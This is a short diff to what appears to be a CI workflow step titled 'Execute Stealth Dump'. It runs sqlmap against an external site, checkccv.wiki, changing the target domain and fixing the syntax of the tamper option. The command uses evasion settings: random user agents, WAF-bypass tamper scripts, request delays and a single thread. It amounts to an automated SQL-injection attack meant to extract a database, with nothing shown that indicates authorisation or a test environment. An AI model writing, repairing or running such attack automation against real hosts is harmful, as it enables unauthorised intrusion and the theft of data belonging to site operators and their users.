@@ -23,9 +23,9 @@ jobs:
     - name: Execute Stealth Dump
       run: |
         cd sqlmap-dev
-        python3 sqlmap.py -u "https://checkccv.kiwi/?action=home&category=5" \
+        python3 sqlmap.py -u "https://checkccv.wiki/?action=home&category=5" \
           --random-agent \
-          --tamper=space2comment,between,charencode,randomcase,
+          --tamper=space2comment,between,charencode,randomcase \
           --delay=0.5 \
           --threads=1 \
           --level=3 \
